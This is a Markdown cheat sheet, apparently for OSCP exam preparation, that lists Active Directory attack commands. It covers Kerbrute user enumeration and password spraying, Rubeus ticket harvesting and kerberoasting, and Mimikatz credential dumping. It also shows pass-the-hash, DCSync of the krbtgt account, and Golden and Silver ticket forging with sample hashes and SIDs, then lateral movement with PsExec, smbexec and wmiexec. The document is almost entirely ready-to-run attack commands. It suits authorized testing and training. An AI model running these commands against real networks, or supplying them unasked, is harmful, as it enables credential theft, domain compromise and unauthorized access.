  - [Kerbrute]
  - [Rubeus]
  - [Roasting]
  - [Mimikatz](https://github.com/conma293/OSCP-tools/blob/master/cheatsheets/BasicAD.md#mimikatz)
  - [Lateral Movement]

# Kerbrute

```./kerbrute_linux_amd64 userenum -d $DOMAIN -dc $DOMAIN_CONTROLLER usernames.txt```

```./kerbrute_linux_amd64 -domain $DOMAIN -users usernames.txt -passwords passwords.txt -outputfile Output_File```

# Rubeus

```Rubeus.exe harvest /interval:30```

```Rubeus.exe brute /password:$PASSWORD /noticket```

```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```

# Roasting

```Rubeus.exe kerberoast/asreproast```

```john hash.txt```

# Mimikatz
https://adsecurity.org/?page_id=1821

#### Turn an NTLM into a TGT:
```
mimikatz#> 
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

```
Klist
Net use //dc1
Klist
```

PSEXEC to DC - 
```.\PsExec.exe \\dc01 cmd.exe```

#### DCSync Attack:
```lsadump::dcsync /user:Administrator```
```lsadump::dcsync /user:domain\krbtgt```


#### Golden:
Jump to DC to dump krbtgt hash:

```psexec.exe \\dc01 cmd.exe```

```
Privilege::debug
lsadump::lsa /patch
```

Now can create a Golden Ticket:
```
Kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```

```
misc::cmd
psexec.exe \\dc01 cmd.exe
```

#### Silver:

Get domain SID  - ```Whoami /user```

```
kerberos::list
mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

#### MAINTENANCE
```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list
```

#### Invoke Mimikatz

Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'

# Lateral Movement
```PsExec.exe -accepteula \\$HOSTNAME cmd```

```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

```smbexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

```wmiexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```

